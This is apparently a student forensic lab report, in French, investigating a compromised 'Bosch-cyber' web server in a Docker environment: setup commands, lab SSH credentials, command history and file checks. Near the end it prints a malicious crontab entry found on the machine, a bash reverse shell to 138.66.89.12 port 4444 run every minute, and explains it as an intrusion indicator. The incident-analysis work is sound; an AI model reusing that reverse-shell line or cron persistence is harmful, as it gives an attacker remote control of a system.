# Rapport d'analyse

## Préparation

Pour intervenir dans ce cas, au préalable il faudra valider certains points de sécurité :

- [x] La station blanche est prête à accueillir l'élément à analyser.

- [x] La station blanche sur laquelle nous effectuons l'analyse est coupé de tout réseau.

- [x] La station blanche sur laquelle nous effectuons l'analyse est coupé de tout périphérique externe.

- [x] L'analyse de la machine s'effectue sur un clone virtuel de l'environnement de production.



## Introduction

Le site web Bosch-cyber a été attaqué. l'attaquant aurait récupéré des outils secrets très dangereux. Heureusement l'administration a mis le site eb maintenance. 

###### La mission : déterminer ce qui a été exfiltré par l'attaquant.

## Méthodologie

Dans cette partie seront données les manières d'analyser l'environnement qui hébèrge le site web Bosch-cyber. 

Aussi : un résumé des IOC[^1] sera effectué.

Les points principaux à évaluer sont les suivants : 

* L'historique des commandes passées
* Les logs générés auparavant sur l'activitée menée
* Les accès entrants et sortants sur l'environnement

Les principaux IOC sont alors les suivants :
* Des adresses IP particulières
* Les hash de fichiers malveillants
* des URLs ou noms de domaines suspects

Les IOC trouvés lors de l'analyse seront présentés et expliqué dans la partie suivante.

[^1]: IOC.
*Un indicateur de compromission, en sécurité informatique, est une déviance ou artefact observé sur un réseau ou dans un système d'exploitation qui indique, avec un haut niveau de certitude, une intrusion informatique.*
*source : [wikipedia.fr](https://fr.wikipedia.org/wiki/Indicateur_de_compromission)*



## Résultats

Dans cette partie sont donnés les résultats de l'analyse complète. On y trouve les données récoltées qui ont fait avancer l'enquête.

##### Partie 1 : découverte de l'environnement

Il a fallut se connecter sur la machine (pour cet analyse via docker) :
```
git clone https://gitlab.com/bosch-forensic/bosch-cyber-leak.git
cd bosch-cyber-leak/
sudo apt install docker.io
sudo apt install docker-compose
cat README.md
```
On nous retourne ceci pour se connecter, un identifiant et un mot de passe :

>docker-compose up -d
>ssh b0sch@127.0.0.1 -p 2222
>9mZzpX7KE6sKAP

On rentre alors ces lignes pour accéder à la machine :
```
docker-compose up -d
ssh b0sch@127.0.0.1 -p 2222
9mZzpX7KE6sKAP
```
Nous sommes maintenant rentrés sur l'environnement, la première chose à faire sera alors de vérifier l'historique des commandes. 

Pour cela taper :
```
history
```

dans cette commande :

![Alt text](https://github.com/LuKieru/FORENSIC_TP_BOURGEOIS_LUCAS/blob/main/TP03/img/history.png "cat_hosts_passwd.png")

on voit qu'il y a un fichier .zip qui a été protégé par un mot de passe "bosch_cyber_tools.zip"
ce mot de passe peut etre lu depuis "/tmp/mypassword"


>unzip bosch_cyber_tools.zip 

demande un ==mot de passe==

> cat /etc/hosts

172.18.0.2

>cat /var/www/html/index.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance Bosch-Cyber</title>
</head>
<body>
    <p>Sorry for the inconvenience. We'e performing some issues at the moment. We'll be back up shortly!</p>
</body>
</html>
```


>cat .cache/
cat .bash_history 
cat .bash_logout 
cat .bashrc 
cat .profile 
cat .viminfo 
>cat .cache/

rien

>cat crontab

*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/138.66.89.12/4444 0>&1'

tache planifiée :
Il s'agit d'une tâche planifiée appelée Cron job, qui est exécutée sur un système Unix.

Le Cron job est configuré pour s'exécuter toutes les minutes (*/1 * * * *). Il exécute la commande /bin/bash -c '/bin/bash -i >& /dev/tcp/138.66.89.12/4444 0>&1'.

Cette commande ouvre un shell Bash et redirige son entrée/sortie vers un socket réseau. Plus précisément, elle envoie toute la sortie standard au socket réseau à l'adresse IP 138.66.89.12 et au numéro de port 4444, et elle envoie toute l'entrée standard depuis le socket réseau vers le shell Bash.

Ceci semble être une tentative de créer un shell inversé vers une machine distante à l'adresse IP et au numéro de port spécifiés. Il est important de noter que de telles actions peuvent être illégales et potentiellement nocives. Il est recommandé de enquêter et de remédier à de telles activités sur un système.

>cat access.log | grep "138.66.89.12"

résultat en image
